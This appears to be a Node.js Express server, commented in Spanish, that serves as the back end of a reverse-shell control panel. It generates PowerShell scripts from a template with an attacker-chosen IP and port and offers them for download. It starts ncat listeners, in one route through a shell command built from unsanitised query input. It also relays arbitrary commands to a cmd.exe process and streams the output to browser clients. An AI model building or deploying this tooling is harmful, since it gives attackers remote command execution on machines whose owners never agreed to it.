const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const bcrypt = require('bcryptjs');
const { exec, spawn } = require('child_process');
const app = express();
const port = 5000;
const http = require('http');
const WebSocket = require('ws');

app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
  console.log('Cliente conectado');
  ws.send('Conexión WebSocket establecida');

  ws.on('close', () => {
    console.log('Cliente desconectado');
  });
});

// Ruta para manejar el registro de usuarios
app.post('/register', async (req, res) => {
  const { username, email, password } = req.body;

  if (!username || !email || !password) {
    return res.status(400).json({ error: 'Todos los campos son obligatorios' });
  }

  const DATA_FILE = path.join(__dirname, 'user-data.json');
  const readJSONFile = () => {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
    return [];
  };

  const writeJSONFile = (data) => {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  };

  const hashedPassword = await bcrypt.hash(password, 10);
  const newUser = { username, email, password: hashedPassword };

  const users = readJSONFile();
  users.push(newUser);
  writeJSONFile(users);

  res.status(201).json({ message: 'Registro exitoso' });
});

// Ruta para manejar el inicio de sesión de usuarios
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Todos los campos son obligatorios' });
  }

  const DATA_FILE = path.join(__dirname, 'user-data.json');
  const readJSONFile = () => {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
    return [];
  };

  const users = readJSONFile();
  const user = users.find(u => u.username === username);

  if (!user) {
    return res.status(401).json({ error: 'Credenciales incorrectas' });
  }

  const isMatch = await bcrypt.compare(password, user.password);

  if (isMatch) {
    res.status(200).json({ message: 'Inicio de sesión exitoso' });
  } else {
    res.status(401).json({ error: 'Credenciales incorrectas' });
  }
});

// Ruta para manejar la generación del script
app.post('/generate-script', (req, res) => {
  const { ip, port, networkName } = req.body;

  if (!ip || !port || !networkName) {
    return res.status(400).json({ error: 'IP, port, and networkName are required' });
  }

  const DATA_FILE = path.join(__dirname, 'network-data.json');

  // Función para leer el archivo JSON
  const readJSONFile = () => {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
    return [];
  };

  // Función para escribir en el archivo JSON
  const writeJSONFile = (data) => {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  };

  // Crear nuevo registro de red
  const newNetworkData = { ip, port, networkName };

  // Leer datos existentes, agregar nuevos datos y guardar en el archivo
  const networkData = readJSONFile();
  networkData.push(newNetworkData);
  writeJSONFile(networkData);

  const templatePath = path.join(__dirname, 'template.ps1');
  
  if (!fs.existsSync(templatePath)) {
    return res.status(500).json({ error: 'Template file not found' });
  }

  fs.readFile(templatePath, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).json({ error: 'Error reading template file' });
    }

    let modifiedScript = data.replace(/IP/g, ip);
    modifiedScript = modifiedScript.replace(/PORT/g, port);

    const filename = `script_${Date.now()}.ps1`;
    const generatedPath = path.join(__dirname, 'public', 'generated', filename);

    fs.mkdir(path.dirname(generatedPath), { recursive: true }, (err) => {
      if (err) {
        return res.status(500).json({ error: 'Error creating directory' });
      }

      fs.writeFile(generatedPath, modifiedScript, 'utf8', (err) => {
        if (err) {
          return res.status(500).json({ error: 'Error writing modified script' });
        }

        // Enviar el archivo generado al cliente
        res.download(generatedPath, filename, (err) => {
          if (err) {
            console.error('Error sending file:', err);
          }
          fs.unlink(generatedPath, (err) => {
            if (err) console.error('Error deleting file:', err);
          });
        });
      });
    });
  });
});

app.get('/check-duplicates', (req, res) => {
  const { ip, port, networkName } = req.query;

  const DATA_FILE = path.join(__dirname, 'network-data.json');

  if (!fs.existsSync(DATA_FILE)) {
    return res.status(200).json({ exists: false });
  }

  const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  const exists = data.some(item => item.ip === ip && item.port === port && item.networkName === networkName);

  res.status(200).json({ exists });
});

// Ruta para ejecutar ncat en segundo plano y obtener el estado del puerto
app.get('/carpetas', (req, res) => {
  const { port } = req.query;

  if (!port) {
    return res.status(400).json({ error: 'Port is required' });
  }

  const ncatCommand = `start /b ncat -nlvp ${port} > nul 2>&1`;

  let responded = false;

  exec(ncatCommand, (errNcat) => {
    if (!responded) {
      if (errNcat) {
        console.error('Error executing ncat command:', errNcat);
        return res.status(500).json({ error: 'Error executing ncat command' });
      }

      res.json({ ncatOutput: 'On' });
      responded = true;
    }
  });

  setTimeout(() => {
    if (!responded) {
      res.json({ ncatOutput: 'Off' });
      responded = true;
    } 
  }, 10000);
});

// Ruta para obtener datos de red desde el archivo network-data.json
app.get('/network-data', (req, res) => {
  const DATA_FILE = path.join(__dirname, 'network-data.json');

  const readJSONFile = () => {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
    return [];
  };

  const networkData = readJSONFile();
  res.json(networkData);
});

let ncatProcess;
let ncatConnected = false; // Estado de conexión

// Ruta para iniciar ncat
app.post('/start-ncat', (req, res) => {
  const port = req.body.port;

  if (ncatProcess) {
    ncatProcess.kill(); // Matar el proceso anterior si existe
  }

  ncatProcess = spawn('ncat', ['-nlvp', 1234]);

  ncatProcess.stdout.on('data', (data) => {
    const message = `Ncat stdout: ${data.toString()}`;
    console.log(message);
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(message);
      }
    });
    
    // Cambia el estado a conectado cuando se recibe salida
    ncatConnected = true;
  });

  ncatProcess.stderr.on('data', (data) => {
    const message = `Ncat stderr: ${data.toString()}`;
    console.error(message);
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(message);
      }
    });
  });

  ncatProcess.on('close', (code) => {
    console.log(`Ncat process exited with code ${code}`);
    ncatConnected = false; // Cambia el estado a desconectado
  });

  res.json({ message: 'Ncat started' });
});


// Asegúrate de que shellProcess esté inicializado correctamente
let shellProcess = spawn('cmd.exe', { shell: true });

app.post('/execute-command', (req, res) => {
  const { command } = req.body;

  if (!ncatConnected) {
    return res.status(403).json({ error: 'Conexión ncat no está activa. No se pueden ejecutar comandos.' });
  }

  if (command === 'cls') {
    shellProcess.stdin.write('cls\n');
    return res.json({ output: '' });
  }

  if (command.startsWith('cd ')) {
    return res.json({ output: `No se puede cambiar de directorio: ${command.split(' ')[1]}` });
  }

  shellProcess.stdin.write(`${command}\n`);

  let output = '';
  let isResponded = false;

  shellProcess.stdout.on('data', (data) => {
    output += data.toString();
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(`Command output: ${data.toString()}`);
      }
    });
  });

  shellProcess.stderr.on('data', (data) => {
    if (!isResponded) {
      isResponded = true;
      return res.status(500).json({ error: data.toString() });
    }
  });

  shellProcess.on('exit', (code) => {
    if (!isResponded) {
      isResponded = true;
      res.json({ output });
    }
  });
});

server.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
